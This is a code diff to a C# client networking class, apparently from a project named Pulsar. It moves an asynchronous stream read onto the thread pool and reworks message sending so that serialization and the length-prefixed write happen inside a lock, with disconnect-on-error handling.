@@ -286,7 +286,21 @@ namespace Pulsar.Client.Networking
 
                 if (_stream != null)
                 {
-                    _stream.BeginRead(_readBuffer, _readOffset, _readLength, AsyncReceive, result.AsyncState);
+                    ThreadPool.QueueUserWorkItem(_ =>
+                    {
+                        try
+                        {
+                            if (_stream != null)
+                            {
+                                _stream.BeginRead(_readBuffer, _readOffset, _readLength, AsyncReceive, result.AsyncState);
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            Disconnect();
+                            OnClientFail(ex);
+                        }
+                    });
                 }
             }
             catch (Exception ex)
@@ -362,36 +376,33 @@ namespace Pulsar.Client.Networking
         /// <param name="message">The message to send.</param>
         private void SafeSendMessage(IMessage message)
         {
-            SslStream localStream;
             lock (_sendMessageLock)
             {
-                localStream = _stream;
-            }
+                if (_stream == null)
+                    return;
 
-            if (localStream == null)
-                return;
-
-            try
-            {
-                var payload = PulsarMessagePackSerializer.Serialize(message);
-                int totalLength = HEADER_SIZE + payload.Length;
-
-                byte[] buffer = ArrayPool<byte>.Shared.Rent(totalLength);
                 try
                 {
-                    BinaryPrimitives.WriteInt32LittleEndian(new Span<byte>(buffer, 0, HEADER_SIZE), payload.Length);
-                    Buffer.BlockCopy(payload, 0, buffer, HEADER_SIZE, payload.Length);
-                    localStream.Write(buffer, 0, totalLength);
+                    var payload = PulsarMessagePackSerializer.Serialize(message);
+                    int totalLength = HEADER_SIZE + payload.Length;
+
+                    byte[] buffer = ArrayPool<byte>.Shared.Rent(totalLength);
+                    try
+                    {
+                        BinaryPrimitives.WriteInt32LittleEndian(new Span<byte>(buffer, 0, HEADER_SIZE), payload.Length);
+                        Buffer.BlockCopy(payload, 0, buffer, HEADER_SIZE, payload.Length);
+                        _stream.Write(buffer, 0, totalLength);
+                    }
+                    finally
+                    {
+                        ArrayPool<byte>.Shared.Return(buffer, clearArray: false);
+                    }
                 }
-                finally
+                catch (Exception ex)
                 {
-                    ArrayPool<byte>.Shared.Return(buffer, clearArray: false);
+                    Disconnect();
+                    OnClientFail(ex);
                 }
-            }
-            catch (Exception ex)
-            {
-                Disconnect();
-                OnClientFail(ex);
             }
         }
 
